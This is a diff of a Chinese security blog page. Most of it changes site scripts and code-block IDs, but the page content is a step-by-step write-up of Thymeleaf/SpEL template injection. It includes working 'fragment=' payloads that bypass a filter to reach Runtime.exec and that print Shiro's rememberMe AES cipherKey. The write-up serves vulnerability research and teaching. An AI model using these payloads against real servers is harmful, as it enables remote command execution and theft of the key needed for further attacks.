+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144224.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"><!-- raw HTML omitted --><br>
 <!-- raw HTML omitted --><!-- raw HTML omitted -->先一步一步来，一点一点删除调用的方法，直到删除到<!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;loadClass('java.lang.Runtime')&lt;/font&gt;</code><!-- raw HTML omitted --> 这个地方成功输出。<!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1779933344398070000" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344398070000">
+<div class="code-block-container" id="code-1779947699575167400" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699575167400">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -683,12 +679,12 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344398070000" title="Toggle" aria-expanded="false" aria-controls="code-1779933344398070000" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699575167400" title="Toggle" aria-expanded="false" aria-controls="code-1779947699575167400" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344398070000-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699575167400-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span></code></pre></td>
@@ -696,9 +692,9 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
 <pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">fragment=__|$${#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass(&#39;java.lang.Runtime&#39;))}|__::.x</span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144328.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+</div><p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144328.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p><!-- raw HTML omitted -->看来是有某个安全监测机制不让获取getRuntime方法，那么还有机会能绕过吗？有的。在 SpEL 中，对于无参数的方法调用，括号 () 是可选的，<!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;getMethods()&lt;/font&gt;</code><!-- raw HTML omitted -->和<!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;getMethods&lt;/font&gt;</code><!-- raw HTML omitted -->作用是一样的，那么试一下把括号去掉是否报错。没有报错，成功获取到getRuntime方法<!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1779933344398571900" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344398571900">
+<div class="code-block-container" id="code-1779947699575167400" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699575167400">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -710,12 +706,12 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344398571900" title="Toggle" aria-expanded="false" aria-controls="code-1779933344398571900" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699575167400" title="Toggle" aria-expanded="false" aria-controls="code-1779947699575167400" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344398571900-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699575167400-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span></code></pre></td>
@@ -723,9 +719,9 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
 <pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">fragment=__|$${#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass(&#39;java.lang.Runtime&#39;).getMethods.?[name==&#39;getRuntime&#39;][0])}|__::.x</span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071145751.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+</div><p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071145751.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p><!-- raw HTML omitted -->那现在继续调试上面完整的利用链。现在只获取到了方法，但是没反射调用，<!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1779933344398571900" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344398571900">
+<div class="code-block-container" id="code-1779947699575167400" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699575167400">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -737,12 +733,12 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344398571900" title="Toggle" aria-expanded="false" aria-controls="code-1779933344398571900" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699575167400" title="Toggle" aria-expanded="false" aria-controls="code-1779947699575167400" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344398571900-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699575167400-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span></code></pre></td>
@@ -750,9 +746,9 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
 <pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">fragment=__|$${#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass(&#39;java.lang.Runtime&#39;).getMethods.?[name==&#39;getRuntime&#39;][0].invoke(null).getClass.getMethods.?[name==&#39;exec&#39;][0])}|__::.x</span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144439.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+</div><p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144439.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p><!-- raw HTML omitted -->由于获取到的是第一个exec方法，在查找当前exec方法的用法后，构造以下利用链：<!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1779933344399085000" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344399085000">
+<div class="code-block-container" id="code-1779947699575664200" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699575664200">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -764,12 +760,12 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344399085000" title="Toggle" aria-expanded="false" aria-controls="code-1779933344399085000" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699575664200" title="Toggle" aria-expanded="false" aria-controls="code-1779947699575664200" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344399085000-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699575664200-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span></code></pre></td>
@@ -778,7 +774,7 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
 </div>
 </div></div>
 </div><p><!-- raw HTML omitted -->等价于<!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;Runtime.exec(Runtime.getRuntime,&quot;calc&quot;);&lt;/font&gt;</code><!-- raw HTML omitted -->,意思就是执行 <!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;Runtime.getRuntime&lt;/font&gt;</code><!-- raw HTML omitted --> 中的 <!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;exec&lt;/font&gt;</code><!-- raw HTML omitted -->方法<!-- raw HTML omitted --></p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144493.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144493.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <h2 id="payload-解析">Payload 解析<a hidden class="anchor" aria-hidden="true" href="#payload-解析">#</a></h2>
 <p><code>fragment=__|$${#response.getWriter().print(''.getClass().forName('java.util.Base64').getMethod('getEncoder').invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))}|__::.x</code></p>
 <p>拼接后完整视图名变为：<code>monitor/cache/cache::__|${...SpEL...}|__::.x</code></p>
@@ -796,7 +792,7 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
 <p><code>.cipherKey</code>   获取 RememberMe 功能使用的 AES 加密密钥（byte[] 类型）</p>
 <p><strong>第四层：</strong></p>
 <p>因为 cipherKey 是 byte[]，直接 print 会乱码，所以需要 Base64 编码：</p>
-<div class="code-block-container" id="code-1779933344399085000" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344399085000">
+<div class="code-block-container" id="code-1779947699575664200" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699575664200">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -808,12 +804,12 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344399085000" title="Toggle" aria-expanded="false" aria-controls="code-1779933344399085000" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699575664200" title="Toggle" aria-expanded="false" aria-controls="code-1779947699575664200" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344399085000-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699575664200-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span><span class="lnt" id="2"><span class="lnlinks">2</span>
@@ -1273,13 +1269,24 @@ document.addEventListener('DOMContentLoaded', function() {
     var overlay = document.getElementById('lightbox-overlay');
     if (!overlay) return;
     var lbImg = overlay.querySelector('.lightbox-img');
+    var prevBtn = overlay.querySelector('.lightbox-prev');
+    var nextBtn = overlay.querySelector('.lightbox-next');
+    var images = Array.from(document.querySelectorAll('.post-content img'));
+    var currentIndex = 0;
 
-    document.querySelectorAll('.post-content img').forEach(function(img) {
+    function showImage(index) {
+        if (!images.length) return;
+        currentIndex = (index + images.length) % images.length;
+        var img = images[currentIndex];
+        lbImg.src = img.currentSrc || img.src;
+        lbImg.alt = img.alt || '';
+    }
+
+    images.forEach(function(img, index) {
         img.style.cursor = 'zoom-in';
         img.addEventListener('click', function(e) {
             e.preventDefault();
-            lbImg.src = this.src;
-            lbImg.alt = this.alt || '';
+            showImage(index);
             overlay.classList.add('active');
             overlay.setAttribute('aria-hidden', 'false');
             document.body.style.overflow = 'hidden';
@@ -1292,12 +1299,27 @@ document.addEventListener('DOMContentLoaded', function() {
         document.body.style.overflow = '';
     }
 
+    function isOpen() {
+        return overlay.classList.contains('active');
+    }
+
     overlay.addEventListener('click', function(e) {
-        if (e.target !== lbImg) closeLightbox();
+        if (e.target !== lbImg && !e.target.closest('.lightbox-nav')) closeLightbox();
     });
     overlay.querySelector('.lightbox-close').addEventListener('click', closeLightbox);
+    prevBtn.addEventListener('click', function(e) {
+        e.stopPropagation();
+        showImage(currentIndex - 1);
+    });
+    nextBtn.addEventListener('click', function(e) {
+        e.stopPropagation();
+        showImage(currentIndex + 1);
+    });
     document.addEventListener('keydown', function(e) {
-        if (e.key === 'Escape' && overlay.classList.contains('active')) closeLightbox();
+        if (!isOpen()) return;
+        if (e.key === 'Escape') closeLightbox();
+        if (e.key === 'ArrowLeft') showImage(currentIndex - 1);
+        if (e.key === 'ArrowRight') showImage(currentIndex + 1);
     });
 })();
 </script>
@@ -1654,88 +1676,6 @@ document.addEventListener('DOMContentLoaded', function() {
 (function() {
     if (window.innerWidth < 768) return;
 
-    var IDLE_MS = 10000;
-    var timer = null;
-    var visible = false;
-
-    
-    var cat = document.createElement('div');
-    cat.setAttribute('aria-hidden', 'true');
-    cat.style.cssText = 'position:fixed;bottom:-60px;right:40px;z-index:9997;pointer-events:none;'
-        + 'transition:bottom .6s cubic-bezier(.34,1.56,.64,1);will-change:bottom';
-
-    
-    cat.innerHTML = '<svg viewBox="0 0 120 100" width="120" height="100" xmlns="http://www.w3.org/2000/svg">'
-        
-        + '<ellipse cx="38" cy="88" rx="12" ry="7" fill="var(--primary)" opacity=".18"/>'
-        + '<ellipse cx="82" cy="88" rx="12" ry="7" fill="var(--primary)" opacity=".18"/>'
-        + '<path d="M28 90 Q30 78 38 76 Q46 78 48 90" fill="var(--secondary)" stroke="var(--primary)" stroke-width="1.5"/>'
-        + '<path d="M72 90 Q74 78 82 76 Q90 78 92 90" fill="var(--secondary)" stroke="var(--primary)" stroke-width="1.5"/>'
-        
-        + '<ellipse cx="38" cy="85" rx="3" ry="2" fill="var(--primary)" opacity=".25"/>'
-        + '<ellipse cx="82" cy="85" rx="3" ry="2" fill="var(--primary)" opacity=".25"/>'
-        
-        + '<ellipse cx="60" cy="52" rx="28" ry="24" fill="var(--secondary)" stroke="var(--primary)" stroke-width="1.8"/>'
-        
-        + '<path d="M36 38 L30 14 L48 30 Z" fill="var(--secondary)" stroke="var(--primary)" stroke-width="1.8" stroke-linejoin="round"/>'
-        + '<path d="M84 38 L90 14 L72 30 Z" fill="var(--secondary)" stroke="var(--primary)" stroke-width="1.8" stroke-linejoin="round"/>'
-        
-        + '<path d="M37 35 L33 18 L46 31 Z" fill="var(--primary)" opacity=".12"/>'
-        + '<path d="M83 35 L87 18 L74 31 Z" fill="var(--primary)" opacity=".12"/>'
-        
-        + '<g class="idle-cat-eyes">'
-        + '<ellipse cx="48" cy="50" rx="5" ry="5.5" fill="var(--primary)"/>'
-        + '<ellipse cx="72" cy="50" rx="5" ry="5.5" fill="var(--primary)"/>'
-        + '<ellipse cx="49" cy="48.5" rx="2" ry="2" fill="var(--secondary)"/>'
-        + '<ellipse cx="73" cy="48.5" rx="2" ry="2" fill="var(--secondary)"/>'
-        + '</g>'
-        
-        + '<path d="M58 56 L60 59 L62 56 Z" fill="var(--primary)" opacity=".5"/>'
-        
-        + '<path d="M60 59 Q56 63 52 60" fill="none" stroke="var(--primary)" stroke-width="1.2" stroke-linecap="round" opacity=".45"/>'
-        + '<path d="M60 59 Q64 63 68 60" fill="none" stroke="var(--primary)" stroke-width="1.2" stroke-linecap="round" opacity=".45"/>'
-        
-        + '<line x1="20" y1="52" x2="42" y2="54" stroke="var(--primary)" stroke-width="1" opacity=".3"/>'
-        + '<line x1="20" y1="58" x2="42" y2="58" stroke="var(--primary)" stroke-width="1" opacity=".3"/>'
-        + '<line x1="78" y1="54" x2="100" y2="52" stroke="var(--primary)" stroke-width="1" opacity=".3"/>'
-        + '<line x1="78" y1="58" x2="100" y2="58" stroke="var(--primary)" stroke-width="1" opacity=".3"/>'
-        + '</svg>';
-
-    document.body.appendChild(cat);
-
-    function show() {
-        if (visible) return;
-        visible = true;
-        cat.style.bottom = '-10px';
-    }
-
-    function hide() {
-        if (!visible) return;
-        visible = false;
-        cat.style.bottom = '-60px';
-    }
-
-    function resetTimer() {
-        hide();
-        clearTimeout(timer);
-        timer = setTimeout(show, IDLE_MS);
-    }
-
-    ['mousemove', 'mousedown', 'keydown', 'scroll', 'touchstart'].forEach(function(evt) {
-        document.addEventListener(evt, resetTimer, { passive: true });
-    });
-
-    timer = setTimeout(show, IDLE_MS);
-})();
-</script>
-
-
-
-
-<script>
-(function() {
-    if (window.innerWidth < 768) return;
-
     var MAX_DEG = 4;
 
     document.querySelectorAll('.post-entry').forEach(function(card) {
@@ -1836,45 +1776,6 @@ document.addEventListener('DOMContentLoaded', function() {
             localStorage.setItem("pref-theme", 'dark');
         }
     })
-</script>
-<script>
-    document.querySelectorAll('pre > code').forEach((codeblock) => {
-        const container = codeblock.parentNode.parentNode;
-        const copybutton = document.createElement('button');
-        copybutton.classList.add('copy-code');
-        copybutton.innerHTML = 'copy';
-
-        function copyingDone() {
-            copybutton.innerHTML = 'copied!';
-            setTimeout(() => {
-                copybutton.innerHTML = 'copy';
-            }, 2000);
-        }
-
-        copybutton.addEventListener('click', (cb) => {
-            if ('clipboard' in navigator) {
-                navigator.clipboard.writeText(codeblock.textContent);
-                copyingDone();
-                return;
-            }
-            const range = document.createRange();
-            range.selectNodeContents(codeblock);
-            const selection = window.getSelection();
-            selection.removeAllRanges();
-            selection.addRange(range);
-            try { document.execCommand('copy'); copyingDone(); } catch (e) { };
-            selection.removeRange(range);
-        });
-
-        if (container.classList.contains("highlight")) {
-            container.appendChild(copybutton);
-        } else if (container.parentNode.firstChild == container) {
-        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
-            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
-        } else {
-            codeblock.parentNode.appendChild(copybutton);
-        }
-    });
 </script>
 </body>
 
